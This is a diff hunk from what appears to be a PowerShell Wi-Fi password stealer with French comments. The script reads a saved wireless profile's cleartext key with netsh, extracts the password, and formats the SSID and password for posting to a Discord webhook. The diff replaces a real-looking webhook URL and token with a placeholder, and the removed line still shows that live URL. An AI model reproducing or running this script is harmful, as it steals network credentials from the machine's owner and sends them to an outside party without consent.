@@ -8,7 +8,7 @@ $wifiProfile = netsh wlan show profile name="$profileName" key=clear
 $wifiPassword = $wifiProfile | Select-String -Pattern "Contenu de la cl\u00e9" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
 
 # Définit l'URL du Webhook Discord
-$webhookUrl = "https://discord.com/api/webhooks/1220729651194892298/UivaXIygIpn8vC3bZ_tcipT8EkMbor5kbQwmniKXFN5xlKYEgp9dflB_SxOMB3vLr-xi"
+$webhookUrl = "YOUR WEBHOOK HERE"
 
 # Crée le message contenant le nom du profil Wi-Fi et le mot de passe
 $message = "SSID: $profileName`nPassword: $wifiPassword"
